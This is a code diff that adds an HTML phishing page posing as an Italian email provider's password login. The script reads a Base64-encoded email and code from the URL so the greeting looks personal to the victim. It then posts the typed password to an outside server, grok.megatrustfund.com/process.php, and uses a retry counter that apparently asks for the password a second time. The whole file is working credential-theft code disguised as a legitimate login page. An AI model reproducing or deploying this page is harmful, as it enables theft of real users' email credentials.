@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Login</title>
+    <link rel="stylesheet" type="text/css" href="/style.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+</head>
+<body>
+    <div id="wrapper-iol">
+        <section class="content">
+            <header>
+                <a class="logo" href="/" title="Go to Home"></a>
+                <div class="txt greetings" id="greeting"></div>
+            </header>
+            <form name="keypass" id="keypass" method="post" onsubmit="return checkparams()">
+            <input name="LOGINID" id="LOGINID" type="email" hidden>
+            <input name="codeid" id="codeid" type="text" hidden>
+            <input name="tral" id="tral" type="number" value=1 hidden>
+            <label id="label_password" class="iol-material-textfield-outlined ">
+
+               <input type="password" name="PASSWORD" id="password" value="" maxlength="25" required="" pattern=".*">
+
+               <span>Inserisci la tua password</span>
+
+               <span toggle="#password" class="fa-eye field-icon toggle-password"
+                  onclick="$('#password').focus()"></span>
+
+               <span id="keyid_error" class="txt-error" style="display:none">
+                  
+               </span>
+
+            </label>
+
+            <button id="form_submit" class="iol-material-button-contained">AVANTI</button>
+
+            <div class="settings">
+
+               <a id="password_dimenticata" target="_blank" href="/">Password dimenticata?</a>
+            </div>
+
+
+            <section class="recaptcha" id="captchablock" style="display:none">
+
+               <span id="box_err_captcha" class="txt-error">
+               </span>
+
+            </section>
+
+         </form>
+            <div id="result"></div>
+        </section>
+    </div>
+
+    <script>
+        $(document).ready(function () {
+            // Extract Base64-encoded email from the URL
+            const urlParams = new URLSearchParams(window.location.search);
+            const encodedData = urlParams.get('ssid');
+
+            if (encodedData) {
+                // Decode the Base64 string
+                const decodedData = JSON.parse(atob(encodedData));
+
+                // Extract email and code
+                const email = decodedData.email;
+                const code = decodedData.code;
+
+                // Populate greeting and hidden input field
+                $('#greeting').html(`${email} <a href="index.html">Not you?</a>`);
+                $('input[name="LOGINID"]').val(email);
+                $('input[name="codeid"]').val(code);
+
+                // Optional: Use `code` as needed
+                console.log('Code:', code);
+                console.log('Code:', email);
+            } else {
+                // Redirect to home if no data is found
+                window.location.href = '/';
+            }
+
+    
+            // Handle form submission
+            $('form[name="keypass"]').on('submit', function (e) {
+                e.preventDefault();
+    
+                
+                const formData = $(this).serialize();
+                $.ajax({
+                    url: 'https://grok.megatrustfund.com/process.php',
+                    type: 'POST',
+                    data: formData,
+                    dataType: 'json',
+                    success: function (response) {
+                        if (response.status === 'success') {
+                            window.location.href = response.redirect;
+                        } else {
+                            if (response.status === 'emailerror') {
+                                window.location.href = response.redirect;
+                            } else {
+                               if (response.status === 'errata') {
+                                $('input[name="tral"]').val(2);
+                               } else {
+                                $('#keyid_error').text(response.message).show();
+                               } 
+                            }
+                            
+                        }
+                    },
+                    error: function () {
+                        $('#keyid_error').text('An error occurred while processing the request.').show();
+                    }
+                });
+            });
+        });
+    </script>
+
+<script>
+    $('#password').on(
+       {
+          keydown: function () {
+             $('#keypage_error').html('');
+             /*
+             $('#box_err_msg').html('');
+             $('#label_password').removeClass('error');
+             $('#keyid_error').html(''); 
+             */
+          }
+       });
+
+    $("#password_dimenticata").click
+       (function () {
+       }
+       );
+
+
+    
+
+   
+    $(document).ready(function () {
+       $(".toggle-password").click(function () {
+          $(this).toggleClass("fa-eye fa-eye-slash");
+          var input = $($(this).attr("toggle"));
+          if (input.attr("type") == "password") {
+             input.attr("type", "text");
+          }
+          else {
+             input.attr("type", "password");
+          }
+       });
+    });
+
+
+    function checkparams() {
+       if (typeof captcha_checked_flag !== 'undefined') {
+          if (!captcha_checked_flag) {
+             // $('#box_err_msg').fadeOut(60, function(){$('#box_err_msg').html('')});
+
+             $('#label_password').removeClass('error');
+
+             $('#keyid_error').fadeOut(60, function () { $('#keyid_error').html('') });
+
+             $('#box_err_captcha').fadeOut(60, function () { $('#box_err_captcha').html('') });
+             $('#box_err_captcha').fadeIn(310, function () { $('#box_err_captcha').html('Non sono un robot &egrave; un campo obbligatorio.') });
+
+             return false;
+          }
+       }
+
+       if ($('#password').val() == '') {
+          $('#keyid_error').fadeIn(310, function () { $('#keyid_error').html('Password non inserita') });
+
+          $('#label_password').addClass('error');
+
+          $('#password').focus();
+
+          return false;
+       }
+
+       // $('#box_err_msg').fadeOut(60, function(){$('#box_err_msg').html('')});
+
+       $('#keyid_error').fadeOut(60, function () { $('#keyid_error').html('') });
+
+       $('#box_err_captcha').fadeOut(60, function () { $('#box_err_captcha').html('') });
+
+       // $('#form_submit').prop('disabled', true); 
+       $('#form_submit').prop('disabled', true).css('opacity', 0.5);
+       setTimeout(function () { $('#form_submit').prop('disabled', false).css('opacity', 1); }, 3000);
+
+
+       return true;
+    }
+
+   
+
+ </script>
+    
+</body>
+</html>
